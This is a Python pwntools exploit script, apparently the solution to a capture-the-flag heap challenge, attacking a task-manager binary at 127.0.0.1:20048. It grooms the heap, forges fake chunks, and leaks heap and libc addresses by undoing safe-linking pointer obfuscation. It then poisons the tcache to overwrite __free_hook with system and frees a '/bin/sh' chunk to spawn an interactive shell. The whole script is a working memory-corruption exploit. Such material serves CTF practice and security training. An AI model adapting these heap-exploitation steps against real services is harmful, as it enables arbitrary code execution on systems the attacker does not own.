from pwn import *

# p = process(["../src/chall"])
p = remote("127.0.0.1",20048)
elf = ELF("../src/chall")
libc = ELF("../src/libc.so.6")

# context.log_level = 'debug'

def add_task(data):
    p.sendlineafter(b"vibe: ", str(1))
    p.sendlineafter(b"description: ",(data))
    p.sendlineafter(b"(1-5): ",str(1))

def display_task():
    p.sendlineafter(b"vibe: ", str(2).encode())

def delete_task(id):
    p.sendlineafter(b"vibe: ", str(3))
    p.sendlineafter(b"delete: ", str(id))

def modif_task(id, data):
    p.sendlineafter(b"vibe: ",str(4))
    p.sendlineafter(b"modify: ", str(id))
    p.sendlineafter(b"description: ",(data))
    p.sendlineafter(b"(1-5): ",str(1))

def exit():
    p.sendlineafter(b"vibe: ",str(5))

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def obfuscate(p, adr):
    return p^(adr>>12)

# Set up heap
for i in range(100):
    add_task((chr(65+i)*0x8).encode() + b"\x71") # to bypass free(): invalid next size (normal)

# gdb.attach(p,gdbscript="""
# init-pwndbg
# br *menu+224
# """)

# To leaks heap address
delete_task(10)
delete_task(11) # tcache equal count

# Point to to 11
modif_task(13,"A"*0x50) # edit to makeit point to xx00
display_task()

p.recvuntil(b"ID: 11\n")
p.recvuntil(b"Description: ")
heap_leaks = deobfuscate(u64((p.recvuntil(b"\n", drop=True).ljust(8,b"\x00"))))
heap_base = heap_leaks  - 0x690
log.info(f"Leak heap\t: {hex(heap_leaks)}")
log.info(f"Heap Base\t: {hex(heap_base)}")

# To leaks libc address
## Create fake chunks, with calculated size 
## To make it small bins stored in xx00 address
modif_task(15,b"A"*0x38 + b"\x41\x07")
## Set Task ID to 0xfff
modif_task(16,b"A"*0x20 + b"B"*8 + b"\xff\x0f")
## Set pointer to index 14
modif_task(16,b"A"*0x20 + b"B"*7) # to clean up null
modif_task(16,b"A"*0x20 + b"B"*6) # to clean up null
modif_task(16,b"A"*0x20 + p64(heap_base+0x850)[:-2])

## To point to our fake chunk in index 15
modif_task(17,"A"*0x50) # edit to makeit point to xx00 that contain fake chunk

## Delete fake chunk 10 to unsorted bin, to leaks libc
delete_task(0xfff)

## Because unsorted bins libc address contain null, need to make it small bins
for i in range(19):
    add_task((chr(65+i)*0x6).encode()) # New allocate, to make it small bins

## Now small bins located in index 31

## Set Task ID to 0xffe
modif_task(32,b"A"*0x20 + b"B"*8 + b"\xfe\x0f")
## Set pointer to index 30
modif_task(32,b"A"*0x20 + b"B"*7) # to clean up null
modif_task(32,b"A"*0x20 + b"B"*6) # to clean up null
modif_task(32,b"A"*0x20 + p64(heap_base+0xf50)[:-2])

## To point to our fake chunk in index 31
modif_task(33,"A"*0x50) # edit to makeit point to xx00 that contain small bins, to leak libc address 

display_task()
p.recvuntil(b"ID: 4094\n")
p.recvuntil(b"Description: ")

libc_leaks = (u64((p.recvuntil(b"\n", drop=True).ljust(8,b"\x00"))))
log.info(f"Leak Libc\t: {hex(libc_leaks)}")

libc.address = libc_leaks - 0x1e0c30

log.info(f"Libc base\t: {hex(libc.address)}")

free = libc.symbols["__free_hook"]
system = libc.symbols["system"]

# To leaks heap address
delete_task(42)
delete_task(43) # tcache equal count

# Point to to 11
modif_task(45,"A"*0x50) # edit to makeit point to xx00

modif_task(43,p64(obfuscate(free,heap_base+0x1500)))

add_task(b"/bin/sh\x00") # tcache to point free hook

add_task(p64(system)) # free_hook = system

delete_task(0x78) # Free /bin/sh

p.interactive()